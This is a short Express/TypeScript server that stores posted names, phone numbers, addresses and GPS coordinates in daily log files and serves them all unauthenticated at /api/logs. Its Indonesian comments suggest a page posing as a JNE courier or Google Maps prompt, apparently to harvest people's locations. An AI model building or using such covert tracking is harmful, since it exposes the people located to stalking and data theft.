import fs from "fs";
import path from "path";

import express from "express";
import cors from "cors";
import helmet from "helmet";
import morgan from "morgan";
import dotenv from "dotenv";

dotenv.config({
  path: ".env",
});

const app = express();

app.use(cors());
app.use(helmet());
app.use(morgan("dev"));
app.use(express.json());

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

app.use(express.static("public"));
app.get("/", (_req, res) => {
  res.sendFile("public/index.html");
});

interface IMaps {
  latitude: number;
  longitude: number;
}
interface ILog {
  id: string;
  name: string;
  phone: string;
  address: string;
  maps: IMaps[];
}

app.get("/api/logs", (_req, res) => {
  const logPath = path.join(__dirname, "logs");
  const logFiles = fs.readdirSync(logPath);
  const logData = logFiles.map((file) => {
    const filePath = path.join(logPath, file);
    const fileData = fs.readFileSync(filePath, "utf-8");
    return JSON.parse(fileData);
  });
  res.json(logData);
});

interface ILocationBody {
  // identitas penerima JNE
  id: string; // generate random string
  name: string; // optional
  phone: string; // optional
  address: string; // optional
  // pilih wahana pengiriman
  // sok2an google map
  latitude: number;
  longitude: number;
}
app.post("/api/location", (req, res) => {
  const body = req.body as ILocationBody;
  if (!body.id || !body.latitude || !body.longitude) {
    return res
      .status(400)
      .json({ message: "Missing id, latitude or longitude" });
  }

  // log file ke folder logs
  const logPath = path.join(__dirname, "logs");
  if (!fs.existsSync(logPath)) {
    fs.mkdirSync(logPath);
  }
  const now = new Date();
  const logFile = path.join(
    logPath,
    `${now.getFullYear()}-${now.getMonth() + 1}-${now.getDate()}.json`
  );
  if (!fs.existsSync(logFile)) {
    fs.writeFileSync(logFile, "[]");
  }
  const logData = JSON.parse(fs.readFileSync(logFile, "utf-8"));
  const existingLog = logData.find((log: ILog) => log.id === body.id);
  if (existingLog) {
    // push map
    existingLog.maps.push({
      latitude: body.latitude,
      longitude: body.longitude,
      timestamp: now.toISOString(),
    });
  } else {
    logData.push({
      id: body.id,
      name: body.name,
      phone: body.phone,
      address: body.address,
      maps: [
        {
          latitude: body.latitude,
          longitude: body.longitude,
          timestamp: now.toISOString(),
        },
      ],
    });
  }
  fs.writeFileSync(logFile, JSON.stringify(logData));

  res.json({ message: "ok!" });
});
